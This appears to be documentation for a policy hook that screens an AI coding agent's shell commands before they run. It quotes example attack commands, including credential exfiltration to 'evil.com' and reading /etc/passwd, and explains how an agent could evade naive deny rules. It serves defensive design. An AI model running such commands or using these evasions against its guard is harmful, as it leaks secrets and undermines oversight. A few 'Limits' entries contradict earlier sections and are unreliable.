# Guarding an agent's shell commands

Grenz's other surfaces sit between an agent and a credential. This one sits
between an agent and its own shell: `grenz hook` runs as a Claude Code
`PreToolUse` hook, and every `Bash` tool call is checked against your policy
before it runs.

```
Claude Code ──PreToolUse──▶ grenz hook ──unix socket──▶ grenz run
                                 │                        │
                                 │                   parse → policy → verdict
                                 ◀────────allow / deny─────┘
```

The hook is deliberately thin: it asks the running proxy and acts on the answer.
The parser, the policy engine, the budget counters and the approval broker all
live in the daemon, so the per-command cost is one socket round-trip rather than
a parser load.

## What this guarantees

> The bash guard confines **which binary runs and with what arguments**. It does
> not and cannot contain what that binary then executes. A permitted command may
> still run code Grenz never sees — from a file, a Makefile, a package script, or
> a git hook.

Read that as the boundary, not as a caveat. "This can cause arbitrary code to
run" is true of `make`, `npm run`, `git` (hooks) and every script interpreter, so
it cannot be the refusal criterion — a guard built on it refuses everything. The
criterion Grenz uses is narrower and checkable:

**Refuse when shell code is handed to a shell that this guard would otherwise
have parsed.** Do not refuse merely because a command is capable of causing code
to run.

Grenz parses bash. `sh -c '<text>'`, `… | sh` and `bash deploy.sh` hand bash
source straight past that parser — a self-referential gap in this guard, and the
only shape it is uniquely obliged to close. `python3` is not that: Grenz was
never going to parse Python, so `python3 -c '…'`, `python3 <<'PY'` and
`python3 build.py` are one thing wearing three hats, and all three are ordinary
`exec:python3` actions.

### Granting a runtime is granting code execution

**`exec:python3` permits arbitrary code execution.** So do `exec:node`,
`exec:bun`, `exec:deno`, `exec:perl`, `exec:ruby`, `exec:make`, `exec:npm`,
`exec:git` (hooks), `exec:ssh` and `exec:docker`. Target globs constrain the
command line, not what the interpreter then runs. Grant these only where that is
acceptable.

This was already true of `python3 build.py`, which Grenz has always permitted.
It is stated here because it used to be partly hidden: refusing `python3 <<'PY'`
concealed the fact for one idiom while leaving every other one open. `grenz run`
now prints `exec_allow_execution_equivalent` for each such grant at startup.

## Setup

**1. Turn the guard on** in `grenz.yaml`:

```yaml
exec_guard: true
```

**2. Add a `bash` grant** to `policy.yaml`. It is an ordinary tool grant — the
same deny-by-default precedence as every other:

```yaml
grants:
  - tool: bash
    allow:
      # Builtins are actions too. Agents open almost every command with
      # `cd <repo> && …`, so without this the first thing they try is denied.
      - action: "exec:cd"
        targets: ["cd /path/to/your/repo*"]
      - action: "exec:git"
        targets: ["git status*", "git add *", "git commit *"]
      - action: "exec:npm"
        targets: ["npm test*", "npm run *"]
      - action: "exec:bun"
        targets: ["bun test*", "bun run *"]
      - action: "exec:ls"
        targets: ["ls", "ls -*", "ls ./*"]
    require_approval:
      - action: "exec:rm"
        targets: ["rm ./*"]
```

Every allow above is anchored by a target, and that is not stylistic. **The
action is only the binary's basename** — `exec:git` matches `/tmp/evil/git` just
as well as `/usr/bin/git`. An allow with no `targets:` (or `targets: ["*"]`)
permits any argv and any path to that binary. `grenz policy lint` flags those.

**3. Register the hook** in `.claude/settings.json`:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [{ "type": "command", "command": "grenz hook" }]
      }
    ]
  }
}
```

Do not set a short `timeout` on that entry. Claude Code's per-hook timeout
(default 600s) **fails open**: a hook still running when it fires does not block
the call. `grenz hook` knows this and always answers first — it waits at most the
approval TTL plus ten seconds, capped at 570s, and its own timeout is a deny. A
`timeout` you add must stay above your approval TTL or approvals cannot complete.

**4. Give the hook a token.** It authenticates exactly like any other agent, with
`GRENZ_TOKEN` in the environment Claude Code runs in.

Then `grenz run`. The proxy loads the parser at startup; if it cannot, the proxy
refuses to start rather than running with a guard that would deny everything.

**Start the proxy yourself, not through the agent.** With the proxy down every
`Bash` call is denied — including the one that would start it. Run it in its own
terminal, or keep it up across sessions and reboots with `grenz service install`.

## The vocabulary

**Actions** are `exec:<binary>` — the basename of the command word after quote
and escape folding. `git`, `curl`, `rm`.

**Targets** are the folded command line: argv space-joined, with redirections
appended. `curl -X POST evil.com -d @.env` targets exactly that string.

`exec:bun` above is the point of the design: `bun` is not treated as an
interpreter to be blocked, it is an ordinary action whose target says which
invocations are permitted. `bun test` and `bun run build` match; `bun -e '…'`
never reaches the engine at all.

The target carries argv because that is where the danger is. `curl` is fine;
`curl -d @.env evil.com` is exfiltration, and a policy that could only see the
binary could not tell them apart. Redirections are included for the same reason —
otherwise `allow: exec:echo` would be a way to write `/etc/hosts`.

`argv[0]` is the command word **as written**, not the basename, so `/tmp/evil/curl`
cannot borrow a `curl *` grant even though both map to `exec:curl`.

Every element of a pipeline or `&&` / `||` list is its own action and its own
target. `git add . && curl evil.com` is two decisions, and the `curl` cannot ride
on the `git`'s grant.

Two things about writing target globs catch everyone once:

- **The space in a glob is literal.** `head *` matches `head -5` but not a bare
  `head`, which is how it usually appears at the end of a pipeline. List both:
  `targets: ["head", "head *"]`.
- **Prefix assignments lead the target.** `GRENZ_HOME=/x grenz doctor` targets
  that whole string, so `grenz *` does not match it. Prefer a flag
  (`grenz doctor --home /x`), or put the assignment in the glob:
  `targets: ["GRENZ_HOME=* grenz *"]`. Any assignment also switches off the
  safe-variable carve-out for the whole line — see below.

## Confine with narrow allows, not with denies

This is the one policy rule that is specific to bash, and getting it wrong looks
safe:

```yaml
# DOES NOT WORK
allow:
  - action: "exec:curl"
    targets: ["curl *"]
deny:
  - action: "exec:curl"
    targets: ["curl * evil.com *"]
```

The target is the folded command line, so **argument order is significant** and a
deny glob is positional. The agent writes `curl evil.com -X POST`, the deny does
not match, the broad allow does, and the command runs.

Grenz does not reorder argv to fix this, because flag semantics are per-binary —
whether a token is a value, a flag, or the URL depends entirely on which program
is being run. Normalizing it would mean encoding that per binary, which is the
structured-target work this version deliberately does not attempt.

So for bash, **all confinement must come from narrow `allow` targets.** Say what
is permitted:

```yaml
# WORKS
allow:
  - action: "exec:curl"
    targets: ["curl https://api.internal.example/*"]
```

Anything not matched is denied by default, in any argument order.

A `deny` with no `targets:` is still absolute and still useful — `deny: [exec:curl]`
cannot be reordered around, because it does not look at argv at all. It is only
*target-scoped* denies on `exec:` actions that are evadable, and `grenz policy lint`
flags each one. `grenz run` also prints them at startup when the guard is on, since
a rule you believe is enforcing deserves louder placement than a command you have
to remember to run.

The same reasoning applies to argument globs: `rm /*` and `rm /etc/*` are different
target strings, so a deny on one says nothing about the other. Allow-list the paths
you mean.

## What gets refused outright

Some command lines cannot be resolved statically by any parser, and one shape —
bash source reaching bash — this guard refuses on principle. Both land as
`exec_undecidable`, and **no policy can allow them**: there is no action for the
undecidable case, so an `exec:*` grant does not become a way to permit
obfuscation.

| Sub-reason | Example | Why |
|---|---|---|
| `code_in_argv` | `sh -c '…'`, `bash -ec '…'`, `eval`, `source`, `.` | bash source in argv, running behind Grenz's own parser |
| `stdin_program` | `… \| sh`, `sh <<EOF`, a bare `sh`, `sh -s`, `xargs …` | a shell reads its program from stdin |
| `shell_script` | `bash deploy.sh`, `sh ./install.sh` | a shell runs a file this guard never parsed |
| `dynamic` | `cat${IFS}/etc/passwd`, `$(echo rm) -rf /tmp/x`, `echo $(id)` | the binary is only known at run time, or an argument runs a command |
| `glob` | `/t?p/evil/curl -d @.env` | the binary resolves against the filesystem at exec time |
| `wrapper_opaque` | `env LD_PRELOAD=/evil curl x`, `timeout --nonsense 5 x` | the wrapped command cannot be located, or the wrapper changed what it is |
| `lossy_parse` | (see the parser note below) | the node set contradicts the raw source |

Everything else is an ordinary `exec:` action, confined by its target:

```
python3 build.py          bun test            node server.js
python3 -c 'print(1)'     bun -e 'x'          node -e 'x'
python3 <<'PY' … PY       awk '{print $1}'    perl -e 'x'
fish -c '…'               make                npm run build
```

`python3 -c` sits in that list on purpose. Refusing it while permitting
`python3 build.py` drew a line around a delivery channel rather than around a
risk — and it refused the *most* analyzable form, since a quoted heredoc carries
the whole program literally in the target. What confines `exec:python3` is a
narrow target (`targets: ["python3 scripts/*.py"]` matches no heredoc and no
`-c`), plus the honest knowledge that the grant is code execution.

The `glob` row matters more than it looks: pathname expansion is the one dynamic
construct carrying no `$` and no backtick, so none of the parser backstops sees
it. Without that rule `/t?p/evil/curl` has basename `curl`, inherits any curl
grant, and the directory resolves at exec time to whatever the agent planted.
Only *unquoted* metacharacters count — `'/tmp/a?b/curl'` is a literal path and
stays decidable, because bash does not expand it either.

Fragmentation is *not* refused, because it is decidable: `c""at /etc/passwd` and
`c\at /etc/passwd` both fold to `cat`, so a policy that denies `cat` is not
bypassed by writing it strangely.

## Unresolved targets: `curl $URL`

Not everything dynamic is undecidable. Split by where the dynamic part sits:

| Shape | Example | What happens |
|---|---|---|
| the **command word** varies | `$CMD foo`, `$(echo rm) -rf x`, `/t?p/evil/curl` | refused before the engine — nothing can be named |
| an argument **runs a command** | `echo $(id)`, `cat <(evil)`, ``git add `id` `` | refused before the engine — a second command executes first |
| an argument's **value** varies | `curl $URL`, `ls $SP`, `git commit -m "$MSG"` | mapped to `exec:curl` and sent to the engine, flagged **unresolved** |

The third row is decidable where it counts: the binary is known. Refusing it
before the engine threw that away and cost two things — an unscoped
`deny: [exec:curl]`, which never looks at argv and so cannot be reordered
around, never got to fire; and `require_approval` was unreachable for a shape a
human could actually answer ("the agent wants to run `curl $URL`; the argument
cannot be verified").

The second row is the line that matters. `$URL` is an unknown *value*;
`$(rm -rf /tmp/x)` is a second command that executes before `echo` is reached.
Routing that to the engine would let an unscoped `allow: [exec:echo]` carry
arbitrary execution, so a substitution anywhere in an argument — including one
buried in `${x:-$(id)}` — is a hard refusal.

### What an unresolved target can and cannot do

- **It can never satisfy a target glob.** In either direction. `curl $URL` does
  not earn `targets: ["curl https://api.internal/*"]`, and it does not trip a
  target-scoped deny either. Unprovable is not matched.
- **It matches rules that do not read targets at all.** An unscoped
  `deny: [exec:curl]` fires, and the log records *that deny* as the reason. An
  unscoped `allow: [exec:curl]` grants it — that grant never read argv, which is
  what `exec_allow_unscoped` warns about.
- **The target keeps the dynamic part as written** (`curl $URL`), so the log line
  and the approval prompt show exactly what the agent asked for. It cannot match
  a glob, so there is no laundering risk in showing it.
- **The flag is per command in a list.** `git add . && curl $URL` is
  `[resolved, unresolved]`; the `git`'s certainty does not cover the `curl`.

### `on_unresolved` — opt in, per action

The default is `deny`, which is byte-for-byte the behaviour that shipped before
this existed: the command is blocked, with a more accurate reason code and a
correctly attributed log entry. Prompting on every unresolved command would
train operators to click through, which is worse than denying.

```yaml
grants:
  - tool: bash
    allow:
      - action: "exec:git"
        targets: ["git status", "git diff*"]
        on_unresolved: approve      # deny (default) | approve
```

With `approve`, an unresolved target whose **action** matches this rule routes to
the normal approval broker instead of being blocked. It does not widen anything
resolved: `git push --force` still fails the target globs and still denies.

The key is rejected on `deny` and `require_approval` clauses — the policy is
malformed, and a malformed policy fails closed. An inert key on the wrong clause
would read as protection that is not there.

### Reason codes

| Code | Decision | Means |
|---|---|---|
| `exec_undecidable` | deny | nothing could be named: command-word dynamism, a glob in the binary, an argument that runs a command, a shell rule |
| `unresolved_target` | deny | the action was decidable, the target was not, and no unscoped rule claimed it |
| `unresolved_approval` | require_approval | same, but an allow rule opted in with `on_unresolved: approve` |
| `explicit_deny` | deny | an unscoped deny fired — including on an unresolved target |

`agent_target_scope` and `delegation_target_scope` also refuse an unresolved
target outright. Those gates ask the agent to demonstrate it stays inside a
boundary, and `curl $URL` cannot — even though the *string* would match a
`curl *` scope.

## Wrappers

`timeout 5 bun test` really runs `bun`. Grenz looks past `timeout`, `nohup`,
`nice`, `setsid`, `stdbuf` and a bare `env` to find the binary that matters, so
`timeout 5 sh -c 'x'` still refuses.

**The action is the unwrapped binary. The target is the full folded line.** Both
halves matter, and policy authors write globs against the second:

```yaml
- action: "exec:bun"
  targets: ["bun test*", "timeout * bun test*"]   # two globs, on purpose
```

The action is `exec:bun` rather than `exec:timeout` because an unscoped
`deny: [exec:curl]` is meant to be absolute — if the action named the wrapper,
`timeout 5 curl evil.com` would slip past it. The target keeps `timeout` visible
because hiding it would make `bun test` and `timeout 0.01 bun test`
indistinguishable to policy: an author who writes `bun test*` must not silently
also permit every wrapper form.

Three binaries are deliberately **not** unwrapped:

- **`sudo` and `doas`** get their own action. `sudo curl x` is not the same risk
  as `curl x`, and mapping it to `exec:curl` would let a curl grant carry
  privilege escalation.
- **`env` unwraps only when it sets nothing.** `env curl x` is `exec:curl`;
  `env LD_PRELOAD=/evil curl x` refuses, because the wrapper has changed what
  `curl` is.
- **`chroot`** likewise changes what a binary is, and keeps its own action.

## Heredocs

A heredoc body is stdin **data**, not argv. It cannot change the command word and
cannot change argv, so a `$VAR` in it has no bearing on what runs.

**A quoted delimiter puts the body in the target.** `<<'PY'` suppresses every
expansion, so the text in the parse tree is exactly the program:

```sh
python3 <<'PY'
import os
print(1)
PY
```

targets `python3 << import os print(1)` — whitespace runs collapsed to single
spaces, capped at 512 characters, and a truncated body carries the count it
dropped: `… ...[+247]`.

That marker is not cosmetic. Without it, an exact-match target
`python3 << import json` would be satisfied by a program that opens with
`import json` and carries 10KB of anything past the cut, because truncation
would hand back precisely the allowed string.

### How much can you glob against a program body?

Honestly: not much. `targets: ["python3 << import json*"]` pins the first line
and leaves the rest to `*`, which is not confinement. An exact full-body match
pins one exact program and breaks on a whitespace change. There is no glob that
usefully constrains "what this Python does".

The body is in the target because of the two places a target actually goes:

- **the approval prompt.** A human answering `require_approval` on
  `exec:python3` used to see `python3 <<` and nothing else — approving a program
  blind. Now they see it.
- **the request log**, for the same reason.

For real narrowing, use the path form. `targets: ["python3 scripts/*.py"]`
matches no heredoc at all, which is usually what an operator means.

### What still refuses

An **unquoted** heredoc runs `$(…)` and backticks before the reader ever sees the
text — a command Grenz never evaluates — so those refuse. An unquoted body with
only a `$VAR` in it is fine, but its text is not its value, so it keeps the bare
`<<` rather than entering the target.

A **shell** reading its program from a heredoc (`sh <<EOF`) is refused by the
stdin rule above, not by this one.

## Expansions, and the four that are allowed

The literal rule is binary: one expansion in the command word or argv makes the
whole command undecidable. `echo $MSG` is refused, and quoted or escaped dollars
are literal and pass — `echo '$5'` and `echo \$5` are fine.

So is any `$` that bash itself leaves alone. A `$` only expands when a name, a
digit, `{`, `(`, `[` or a special parameter follows it, so
`grep -E "pass$|fail$"` and `echo "cost: 5$"` are ordinary literals. One shape
stays refused: an unquoted `$` at the very end of a word (`echo 5$`), because
that is exactly where the parser defect below hides an expansion. Quote it.

Four environment names are carved out and treated as literal:

```
$HOME    $PWD    $USER    $TMPDIR
```

They fold to **their own text**, not their value: Grenz does not know the agent's
environment, and the policy engine must stay pure and synchronous. So a policy
writes the name:

```yaml
- action: "exec:cat"
  targets: ["cat $HOME/.config/myapp/*"]
```

Only the exact forms `$HOME` and `${HOME}` qualify. Every modifier form
(`${HOME:-/evil}`, `${HOME#x}`, `${!HOME}`) and every near-miss (`$HOMEX`) stays
dynamic.

**The carve-out switches off for the whole line if anything in that line could
redefine one of the names** — any assignment, any `export`/`unset`/`declare`, any
`cd`/`pushd` (which move `$PWD`), and `su`/`sudo`/`env`/`chroot`. So
`HOME=/evil cat $HOME/x` and `cd /evil && ls $PWD` both refuse.

### The assumption this rests on

Claude Code spawns a **fresh shell per Bash call**; shell state does not carry
across calls. An agent therefore cannot redefine `$HOME` in one call and spend it
in the next, which is what makes the carve-out sound with only a same-line check.

That was **observed on Claude Code 2.1.231**, two ways: the Bash tool's own
description states "Shell state (env vars, functions) does not persist; the shell
is initialized from the user's profile", and a direct test confirmed it — an
exported variable read back as unset on the following call, with a different
shell PID. It is observed behaviour, not a documented contract. **If a future
version keeps shell state between calls, this carve-out has to be revisited.**

## What the hook does with a verdict

**Allow** exits 0 and emits no decision. A Grenz allow is the absence of an
objection, not an instruction to run — Claude Code's own permission flow still
applies. Emitting `"allow"` would bypass your own allow-list and prompts, making
Grenz a way to *widen* permissions. Grenz only narrows.

**Deny** is expressed twice: the `permissionDecision: "deny"` JSON on stdout, and
**exit code 2**. Both are needed. Claude Code has a known bug ([#18312]) where a
tool already on the allow-list ignores the hook's `permissionDecision` — so for
exactly the users who allow-listed `Bash`, the JSON alone would fail open. Exit 2
blocks unconditionally and feeds the reason back to the model.

**Require approval** blocks in the daemon on the same broker as every other
Grenz approval: `grenz approve <id>`, the console, or Slack. The hook waits, so
the agent's command is held until a human decides or the TTL expires — and an
expired approval denies. When that happens, the reason fed back to the agent says
an approval went unanswered and points at `grenz approvals`, rather than claiming
the proxy is down.

[#18312]: https://github.com/anthropics/claude-code/issues/18312

## Failure is denial

Every one of these blocks the command:

- the proxy is not running, or the socket is gone
- the request times out
- `GRENZ_TOKEN` is unset
- the hook payload has no readable `tool_name` or `command`
- the command does not parse as bash
- the parse is lossy (see below)
- the agent's token is revoked

There is no local fallback evaluation and no fallback to allow. If Grenz cannot
answer, the command does not run.

The one failure Grenz cannot turn into a denial is Claude Code's own per-hook
timeout, which lets the call proceed. The hook closes that by always returning
before it — see the note under step 3 of Setup.

## A note on the parser

Grenz parses with tree-sitter (`vendor/wasm/tree-sitter-bash.wasm`, pinned and
hash-checked in CI — see `proxy/vendor/wasm/PROVENANCE.md`).

That grammar has a defect: it can drop an expansion node while still reporting a
clean parse, so a word that really contains `$IFS` can present as a pure literal.
Found by differential fuzzing against a second parser over ~900k inputs.

Grenz does not trust the parser's node set alone. Every word folded to a literal
is re-checked against its own raw source; a `$` that bash would expand, a
backtick, `<(` or `>(` surviving there contradicts the parse, and a
contradiction denies. This closes
the class rather than the instance — a future grammar defect that drops a
different node is caught by the same check.

## Limits worth knowing

- **`sh -c '<literal>'` is refused, not re-parsed.** Recursing into it would be a
  real usability win; it needs its own nesting and re-entry rules, and getting
  those wrong reopens the hole the code-in-argv rule closes.
- **A program on stdin is refused, not read.** `python3 <<PY … PY` is a common
  agent idiom and Grenz has nothing useful to say about it: guarding the Python
  inside would be a Python guard, not a bash one.
- **`sudo` is not unwrapped, so `sudo sh -c '…'` is `exec:sudo`, not a refusal.**
  It still needs an explicit `exec:sudo` grant and the target carries the whole
  line. Unwrapping it would let a `curl` grant carry privilege escalation, which
  is the worse trade.
- **Nothing outside the shell rules is modelled per-flag.** `sed 's/x/y/e'`,
  `find … -exec …` and `node --require ./evil.js` all execute, and Grenz reads
  none of their flags. Their argv is in the target, so a narrow allow still
  confines them; a broad one does not. This is the same statement as "granting a
  runtime is granting code execution", one level out.
- **The guard is same-user.** It stops an agent's *tool calls*, not a process
  that already has your shell. An agent that can write and run its own script
  outside the `Bash` tool is outside this boundary.
- **Heredoc bodies are not matched.** A heredoc is stdin data, not argv, so it is
  not folded into the target; one that would be expanded (`$` or a backtick with
  an unquoted delimiter) is refused instead.
